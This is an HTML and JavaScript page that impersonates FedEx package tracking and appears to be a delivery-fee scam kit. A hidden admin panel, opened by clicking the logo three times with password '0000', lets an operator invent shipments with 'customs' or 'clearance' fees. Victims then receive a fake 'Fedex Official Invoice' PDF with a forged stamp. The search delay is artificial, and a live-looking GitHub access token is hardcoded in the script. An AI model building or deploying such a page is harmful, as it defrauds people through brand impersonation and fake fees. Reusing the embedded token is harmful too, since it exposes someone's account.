<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fedex Tracking - Global Logistics</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        .fedex-purple { color: #4D148C; }
        .fedex-orange { color: #FF6200; }
        .bg-fedex-purple { background-color: #4D148C; }
        .hidden { display: none; }
        #loading-overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(255,255,255,0.9); display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 1000;
        }
    </style>
</head>
<body class="bg-gray-100 font-sans">

    <nav class="bg-white shadow-md p-4 flex justify-between items-center">
        <div id="logo-btn" class="cursor-pointer select-none">
            <span class="text-3xl font-black fedex-purple tracking-tighter">Fed</span><span class="text-3xl font-black fedex-orange tracking-tighter">ex</span>
        </div>
        <div class="text-xs text-gray-500">Express Delivery</div>
    </nav>

    <div id="loading-overlay" class="hidden">
        <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-fedex-purple"></div>
        <p class="mt-4 font-bold fedex-purple">Searching Tracking Database...</p>
    </div>

    <main id="client-view" class="max-w-md mx-auto mt-10 p-6">
        <div class="bg-white p-6 rounded-lg shadow-lg">
            <h1 class="text-xl font-bold mb-4 text-gray-800">Track your package</h1>
            <input type="text" id="track-input" placeholder="Enter Tracking ID" class="w-full border p-3 rounded mb-4 focus:outline-none focus:border-fedex-purple">
            <button onclick="trackPackage()" class="w-full bg-fedex-purple text-white font-bold py-3 rounded hover:opacity-90 transition">TRACK</button>
        </div>

        <div id="results-display" class="mt-6 hidden">
            <div class="bg-white p-6 rounded-lg shadow-lg border-l-4 border-fedex-orange">
                <div class="flex justify-between items-start mb-4">
                    <div>
                        <p class="text-sm text-gray-500">Status</p>
                        <h2 id="res-status" class="text-2xl font-black fedex-purple italic uppercase"></h2>
                    </div>
                    <div id="invoice-box" class="hidden">
                        <button onclick="downloadInvoice()" class="bg-green-600 text-white text-xs px-3 py-2 rounded">Download Invoice</button>
                    </div>
                </div>
                
                <div class="grid grid-cols-2 gap-4 text-sm border-t pt-4">
                    <div><p class="text-gray-500">Recipient</p><p id="res-name" class="font-bold"></p></div>
                    <div><p class="text-gray-500">Tracking ID</p><p id="res-id" class="font-bold"></p></div>
                    <div><p class="text-gray-500">From</p><p id="res-from"></p></div>
                    <div><p class="text-gray-500">To</p><p id="res-to"></p></div>
                </div>

                <div class="mt-4 p-3 bg-gray-50 rounded">
                    <p class="text-xs text-gray-500 uppercase">Package Photo</p>
                    <img id="res-img" src="" class="mt-2 w-full rounded shadow-sm hidden">
                </div>
            </div>
        </div>
    </main>

    <div id="admin-view" class="hidden max-w-2xl mx-auto mt-10 p-6 bg-white shadow-2xl rounded-xl">
        <h2 class="text-2xl font-bold border-b pb-2 mb-4">Admin Management</h2>
        <div class="space-y-4">
            <div class="grid grid-cols-2 gap-4">
                <input type="text" id="adm-name" placeholder="Client Name" class="border p-2 rounded">
                <input type="text" id="adm-id" placeholder="Tracking Code" class="border p-2 rounded">
                <input type="text" id="adm-from" placeholder="Origin City" class="border p-2 rounded">
                <input type="text" id="adm-to" placeholder="Destination" class="border p-2 rounded">
            </div>
            <div class="grid grid-cols-2 gap-4">
                <input type="text" id="adm-depart" placeholder="Departure Time" class="border p-2 rounded">
                <input type="text" id="adm-arrive" placeholder="Arrival Time" class="border p-2 rounded">
            </div>
            <select id="adm-status" class="w-full border p-2 rounded bg-gray-50">
                <option value="Loading">Loading</option>
                <option value="In transit (moving)">In transit (moving)</option>
                <option value="Hold">Hold</option>
                <option value="Held at customs">Held at customs (fee required)</option>
                <option value="Arrived">Arrived (Clearance fee required)</option>
            </select>
            <input type="number" id="adm-fee" placeholder="Fee Amount ($)" class="w-full border p-2 rounded">
            
            <div class="border-2 border-dashed p-4 text-center">
                <p class="text-sm mb-2 text-gray-500">Upload Package Image</p>
                <input type="file" id="adm-file" accept="image/*" class="text-xs">
            </div>

            <button onclick="saveToCloud()" class="w-full bg-orange-600 text-white font-bold py-4 rounded shadow-lg hover:bg-orange-700">SAVE TO CLOUD</button>
        </div>
    </div>

    <script>
        const GITHUB_TOKEN = "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";
        const REPO_NAME = "fedex-trackshippingcode";
        const USERNAME = "fedex-trackshippingcode";
        const FILE_PATH = "data.json";

        let packageDatabase = {};

        // 1. Initialize & Fetch Data from GitHub
        async function loadDatabase() {
            try {
                const response = await fetch(`https://api.github.com/repos/${USERNAME}/${REPO_NAME}/contents/${FILE_PATH}`, {
                    headers: { Authorization: `token ${GITHUB_TOKEN}` }
                });
                if (response.ok) {
                    const data = await response.json();
                    packageDatabase = JSON.parse(atob(data.content));
                    window.fileSha = data.sha;
                }
            } catch (e) { console.log("Database initialized."); }
        }

        // 2. Admin Login Logic
        let clickCount = 0;
        document.getElementById('logo-btn').onclick = () => {
            clickCount++;
            if (clickCount >= 3) {
                let pass = prompt("Enter Admin Password:");
                let token = prompt("Enter Token:");
                if (pass === "0000" && token === GITHUB_TOKEN) {
                    document.getElementById('client-view').classList.add('hidden');
                    document.getElementById('admin-view').classList.remove('hidden');
                }
                clickCount = 0;
            }
        };

        // 3. Save Data to GitHub (The "Cloud")
        async function saveToCloud() {
            const fileInput = document.getElementById('adm-file');
            let imgBase64 = "";

            if (fileInput.files[0]) {
                const reader = new FileReader();
                reader.onloadend = async function() {
                    imgBase64 = reader.result;
                    processSave(imgBase64);
                };
                reader.readAsDataURL(fileInput.files[0]);
            } else {
                processSave("");
            }
        }

        async function processSave(imgData) {
            const id = document.getElementById('adm-id').value;
            packageDatabase[id] = {
                name: document.getElementById('adm-name').value,
                from: document.getElementById('adm-from').value,
                to: document.getElementById('adm-to').value,
                depart: document.getElementById('adm-depart').value,
                arrive: document.getElementById('adm-arrive').value,
                status: document.getElementById('adm-status').value,
                fee: document.getElementById('adm-fee').value,
                image: imgData,
                date: new Date().toLocaleDateString()
            };

            const content = btoa(JSON.stringify(packageDatabase));
            const body = {
                message: "Update tracking data",
                content: content,
                sha: window.fileSha || ""
            };

            const res = await fetch(`https://api.github.com/repos/${USERNAME}/${REPO_NAME}/contents/${FILE_PATH}`, {
                method: "PUT",
                headers: { Authorization: `token ${GITHUB_TOKEN}`, "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });

            if (res.ok) {
                alert("Saved successfully to Cloud!");
                location.reload();
            }
        }

        // 4. Client Tracking Logic
        async function trackPackage() {
            const id = document.getElementById('track-input').value;
            if (!id) return;

            document.getElementById('loading-overlay').classList.remove('hidden');
            
            // Artificial 3-second delay
            setTimeout(async () => {
                await loadDatabase();
                const pkg = packageDatabase[id];
                document.getElementById('loading-overlay').classList.add('hidden');

                if (pkg) {
                    document.getElementById('results-display').classList.remove('hidden');
                    document.getElementById('res-status').innerText = pkg.status;
                    document.getElementById('res-name').innerText = pkg.name;
                    document.getElementById('res-id').innerText = id;
                    document.getElementById('res-from').innerText = pkg.from;
                    document.getElementById('res-to').innerText = pkg.to;
                    
                    if (pkg.image) {
                        document.getElementById('res-img').src = pkg.image;
                        document.getElementById('res-img').classList.remove('hidden');
                    }

                    if (pkg.status === "Arrived" && pkg.fee) {
                        document.getElementById('invoice-box').classList.remove('hidden');
                        window.currentInvoice = pkg;
                    }
                } else {
                    alert("Tracking code not found.");
                }
            }, 3000);
        }

        // 5. Generate Invoice
        function downloadInvoice() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const pkg = window.currentInvoice;

            doc.setFontSize(22);
            doc.setTextColor(77, 20, 140);
            doc.text("Fedex Official Invoice", 20, 20);
            
            doc.setFontSize(12);
            doc.setTextColor(0, 0, 0);
            doc.text(`Date: ${pkg.date}`, 20, 40);
            doc.text(`Tracking ID: ${document.getElementById('track-input').value}`, 20, 50);
            doc.text(`Customer: ${pkg.name}`, 20, 60);
            doc.text(`Origin: ${pkg.from}`, 20, 70);
            doc.text(`Destination: ${pkg.to}`, 20, 80);
            
            doc.setDrawColor(255, 98, 0);
            doc.rect(20, 90, 170, 40);
            doc.text("SERVICE CHARGE / CLEARANCE FEE", 25, 105);
            doc.setFontSize(20);
            doc.text(`TOTAL: $${pkg.fee}`, 25, 120);

            // Stamp simulation
            doc.setTextColor(200, 0, 0);
            doc.setFontSize(30);
            doc.text("OFFICIAL STAMP", 120, 160, { angle: 15 });
            
            doc.save(`Invoice_${pkg.name}.pdf`);
        }

        window.onload = loadDatabase;
    </script>
</body>
</html>
